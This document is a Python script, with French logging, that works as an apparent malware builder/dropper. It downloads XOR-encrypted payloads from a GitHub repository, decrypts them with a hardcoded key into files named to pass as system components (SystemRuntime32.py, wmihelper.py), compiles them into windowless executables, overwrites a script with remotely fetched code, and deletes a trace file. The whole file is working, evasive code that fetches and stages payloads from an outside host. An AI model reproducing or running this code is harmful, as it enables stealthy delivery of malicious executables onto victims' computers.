import os
import tempfile
import requests

def xor_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def download_and_decrypt(url, output_path, key):
    try:
        print(f"[↓] Téléchargement de : {url}")
        r = requests.get(url)
        r.raise_for_status()
        encrypted = r.text
        decrypted = xor_decrypt(encrypted, key)

        with open(output_path, "w", encoding="utf-8") as f:
            f.write(decrypted)
        print(f"[✓] Décrypté et enregistré dans : {output_path}")
        return True
    except Exception as e:
        print(f"[✗] Erreur : {e}")
        return False

def compiler_en_exe(path, output_dir):
    exe_name = os.path.splitext(os.path.basename(path))[0]
    os.system(
        f"pyinstaller --noconsole --onefile \"{path}\" "
        f"--distpath \"{output_dir}\" --name \"{exe_name}\""
    )
    print(f"[✓] Compilé : {exe_name}.exe → {output_dir}")

def modifier_et_supprimer_trace():
    temp_dir = tempfile.gettempdir()
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        print(f"[...] Téléchargement depuis {raw_url}")
        r = requests.get(raw_url, timeout=10)
        if r.status_code == 200 and r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script mis à jour avec succès : {chemin_script}")
        else:
            print(f"[!] Échec du téléchargement. Code HTTP : {r.status_code}")
    except Exception as e:
        print(f"[!] Erreur lors du téléchargement : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur lors de la suppression : {e}")

def main():
    key = "LUCORACORE987"
    urls = {
        "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
        "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
    }

    output_dir = r"C:\Users\LOUKITA\Desktop\Test23"
    os.makedirs(output_dir, exist_ok=True)

    decrypted_paths = []

    for name, url in urls.items():
        output_path = os.path.join(tempfile.gettempdir(), name)
        if download_and_decrypt(url, output_path, key):
            decrypted_paths.append(output_path)

    print("\n[🛠] Compilation en .exe (mode invisible)...")
    for path in decrypted_paths:
        compiler_en_exe(path, output_dir)

    print("\n[✓] Compilation terminée.")

    # Partie update du script original
    modifier_et_supprimer_trace()

if __name__ == "__main__":
    main()
